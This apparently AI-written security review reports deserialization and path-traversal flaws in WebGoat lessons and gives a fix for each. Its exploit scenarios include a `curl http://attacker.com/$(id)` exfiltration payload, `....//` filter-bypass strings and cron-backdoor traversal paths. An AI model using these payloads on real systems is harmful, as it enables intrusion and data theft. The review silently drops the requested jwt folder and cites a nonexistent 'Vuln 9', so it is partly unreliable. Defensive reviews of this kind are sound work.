# Security Review Report — claude-report-2.md

**Prompt Used:** 
```
read .claude\commands\security-review.md and perform a security review on the following folders inside the \src\main\java\org\owasp\webgoat\lessons folder: jwt, deserialization, & pathtraversal.
```

**Date:** 2026-03-31 
**Scope:** `lessons/deserialization`, `lessons/pathtraversal`
**Reviewer:** Claude (senior security engineer mode)

---

## Summary

| # | Severity | Category | File | Confidence |
|---|----------|----------|------|------------|
| 1 | HIGH | Deserialization RCE | `InsecureDeserializationTask.java:45` | 10/10 |
| 2 | HIGH | Path Traversal — File Written Before Traversal Check | `ProfileUploadBase.java:51` | 10/10 |
| 3 | HIGH | Path Traversal — `../` Filter Bypass | `ProfileUploadFix.java:43` | 9/10 |
| 4 | HIGH | Path Traversal — Traversal via Original Filename | `ProfileUploadRemoveUserInput.java:41` | 10/10 |
| 5 | HIGH | Path Traversal — Zip Slip | `ProfileZipSlip.java:79` | 10/10 |

---

## Findings

---

### Vuln 1: Deserialization RCE — `InsecureDeserializationTask.java:45`

* **Severity:** HIGH
* **Category:** Deserialization RCE
* **Confidence:** 10/10

**Description:**
`POST /InsecureDeserialization/task` accepts a base64-encoded blob, decodes it, and passes it directly to `ObjectInputStream.readObject()` with no class filtering or allowlisting. The dangerous `readObject()` call fires **before** the `instanceof VulnerableTaskHolder` check — meaning any deserialization gadget chain in the classpath executes during the `readObject()` call itself, regardless of the type check result.

```java
// InsecureDeserializationTask.java:42-51
try (ObjectInputStream ois =
    new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(b64token)))) {
  before = System.currentTimeMillis();
  Object o = ois.readObject();           // RCE fires HERE — before any type check
  if (!(o instanceof VulnerableTaskHolder)) {
    // ... too late, gadget already executed
  }
```

The presence of `VulnerableTaskHolder` (from `org.dummy.insecure.framework`) in the classpath provides a ready-made gadget that executes a system command during deserialization.

**Exploit Scenario:**
1. Attacker serializes a `VulnerableTaskHolder` (or another gadget chain via ysoserial) with a payload command such as `curl http://attacker.com/$(id)`.
2. Attacker base64-encodes the serialized blob and submits it as the `token` parameter.
3. The server calls `readObject()`, the gadget triggers, and the OS command executes with the JVM's privileges.
4. The type check afterward is irrelevant — RCE already occurred.

**Recommendation:** Replace raw `ObjectInputStream` with a deserialization filter using `ObjectInputFilter` (Java 9+) that allowlists only `VulnerableTaskHolder`. Better still, replace Java serialization entirely with a data format that does not support arbitrary code execution (e.g., JSON).

---

### Vuln 2: Path Traversal — File Written Before Traversal Check — `ProfileUploadBase.java:51`

* **Severity:** HIGH
* **Category:** Path Traversal
* **Confidence:** 10/10

**Description:**
`ProfileUploadBase.execute()` constructs a file path from the user-controlled `fullName` parameter and writes the uploaded content to disk **before** checking whether the resolved path escapes the intended upload directory. The traversal detection (via `getCanonicalPath()` comparison) happens after the file has already been created and populated.

```java
// ProfileUploadBase.java:51-57
var uploadedFile = new File(uploadDirectory, fullName);
uploadedFile.createNewFile();                          // file created at traversed path
FileCopyUtils.copy(file.getBytes(), uploadedFile);     // content written to traversed path

if (attemptWasMade(uploadDirectory, uploadedFile)) {   // detection AFTER write — too late
    return solvedIt(uploadedFile);
}
```

This affects both `ProfileUpload` (`POST /PathTraversal/profile-upload`) and `ProfileUploadFix` (after its inadequate filter is bypassed).

**Exploit Scenario:**
An attacker sends `fullName=../../../tmp/malicious` with any file content. The server resolves the path, creates the file outside `PathTraversal/<username>/`, writes the content, then detects the traversal — but the file has already been written. With sufficient write permissions, an attacker could overwrite application config files, deploy a web shell, or corrupt other users' data.

**Recommendation:** Resolve the canonical path of the target file **before** any `createNewFile()` or write operation. Reject the request immediately if the canonical path does not start with the canonical path of the intended upload directory.

---

### Vuln 3: Path Traversal — `../` Filter Bypass — `ProfileUploadFix.java:43`

* **Severity:** HIGH
* **Category:** Path Traversal
* **Confidence:** 9/10

**Description:**
`POST /PathTraversal/profile-upload-fix` attempts to prevent path traversal by stripping literal `"../"` from the `fullName` parameter. This is a naive blacklist that is trivially bypassed.

```java
// ProfileUploadFix.java:43
return super.execute(file, fullName != null ? fullName.replace("../", "") : "", username);
```

**Bypass payloads:**
- `....//` → after `replace("../", "")` → `../`
- `..././` → after replace → `../`
- `....\/` → after replace → `..\` (Windows path separator)

**Exploit Scenario:**
An attacker sends `fullName=....//....//....//etc/cron.d/backdoor`. After the `replace("../", "")` call, the string becomes `../../../etc/cron.d/backdoor`. This is then passed to `super.execute()`, which creates the file at the traversed location (see Vuln 2 for the write-before-check issue).

**Recommendation:** Do not use string replacement to sanitize path components. Use `Path.normalize()` followed by a canonical path prefix check:
```java
Path resolved = uploadDirectory.toPath().resolve(fullName).normalize();
if (!resolved.startsWith(uploadDirectory.toPath())) { reject(); }
```

---

### Vuln 4: Path Traversal — Traversal via Original Filename — `ProfileUploadRemoveUserInput.java:41`

* **Severity:** HIGH
* **Category:** Path Traversal
* **Confidence:** 10/10

**Description:**
`POST /PathTraversal/profile-upload-remove-user-input` removes the user-supplied `fullName` parameter to avoid injection, but replaces it with `file.getOriginalFilename()` — which is also fully attacker-controlled and is sourced from the `Content-Disposition` header of the multipart upload.

```java
// ProfileUploadRemoveUserInput.java:41
return super.execute(file, file.getOriginalFilename(), username);
```

The original filename can contain arbitrary path traversal sequences: `../../etc/cron.d/backdoor`.

**Exploit Scenario:**
Attacker crafts a multipart request where the filename in the `Content-Disposition` header is `../../../tmp/evil.jsp`. This is passed directly to `super.execute()` as `fullName`, which then writes the file to the traversed location (same write-before-check flow as Vuln 2).

**Recommendation:** Never trust `getOriginalFilename()`. Strip all path components, keeping only the base filename: `Paths.get(file.getOriginalFilename()).getFileName().toString()`. Then apply a canonical path check as described in Vuln 9.

---

### Vuln 5: Path Traversal — Zip Slip — `ProfileZipSlip.java:79`

* **Severity:** HIGH
* **Category:** Path Traversal
* **Confidence:** 10/10

**Description:**
`POST /PathTraversal/zip-slip` extracts ZIP archive entries using `e.getName()` to construct destination paths, without any validation that the resolved path stays within the intended extraction directory. This is the classic "Zip Slip" vulnerability.

```java
// ProfileZipSlip.java:77-81
while (entries.hasMoreElements()) {
    ZipEntry e = entries.nextElement();
    File f = new File(tmpZipDirectory.toFile(), e.getName()); // e.getName() is attacker-controlled
    InputStream is = zip.getInputStream(e);
    Files.copy(is, f.toPath(), StandardCopyOption.REPLACE_EXISTING); // no path check before write
}
```

There is no `getCanonicalPath()` check anywhere in this extraction loop.

**Exploit Scenario:**
Attacker creates a ZIP containing an entry named `../../etc/cron.d/backdoor` with a malicious cron payload as content. Server extracts the file, resolving `../../` above `tmpZipDirectory`, and writes the content to the host filesystem. With write access to sensitive directories (cron, web root, SSH authorized_keys), this leads to persistent code execution.

**Recommendation:** For every ZIP entry, assert that the canonical destination path starts with the canonical extraction directory path before writing:
```java
File dest = new File(targetDir, entry.getName());
if (!dest.getCanonicalPath().startsWith(targetDir.getCanonicalPath() + File.separator)) {
    throw new IOException("Zip Slip detected: " + entry.getName());
}
```
